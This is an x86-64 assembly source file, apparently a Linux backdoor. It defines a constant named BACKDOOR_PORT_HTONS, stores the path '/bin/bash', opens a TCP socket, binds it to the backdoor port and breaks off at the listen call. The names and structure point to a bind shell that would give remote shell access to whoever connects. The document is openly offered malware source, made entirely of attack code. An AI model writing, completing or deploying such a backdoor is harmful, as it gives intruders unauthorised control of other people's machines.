.include "defs.h"
NULL = 0
SIZEOF_STRUCT_SOCKADDR = 16
ACCEPTED_CONNECTIONS = 1
BACKDOOR_PORT_HTONS = 0xE307
.text
.bss
.align 16
.type sock_address, @object
.size sock_address, 16
sock_address:
.zero 16
.comm sock,4,4
.comm sock_fd,4,4
.globl bash
.section .rodata
.bash_str_data:
.string "/bin/bash"
.data
.align 8
.type bash, @object
.size bash, 8
bash:
.quad .bash_str_data
.text
.globl main
.type main, @function
.section .text
.global _start
_start:
movq $SYS_SOCKET, %rax
movl $AF_INET, %edi
movl $SOCK_STREAM, %esi
movl $IPPROTO_TCP, %edx
syscall
movl %eax, sock(%rip)
movq $SYS_BIND, %rax
movw $AF_INET, sock_address(%rip)
movw $BACKDOOR_PORT_HTONS, sock_address+2(%rip)
movl sock(%rip), %edi
movl $SIZEOF_STRUCT_SOCKADDR, %edx
movl $sock_address, %esi
syscall
movq $SYS_LISTEN, %rax
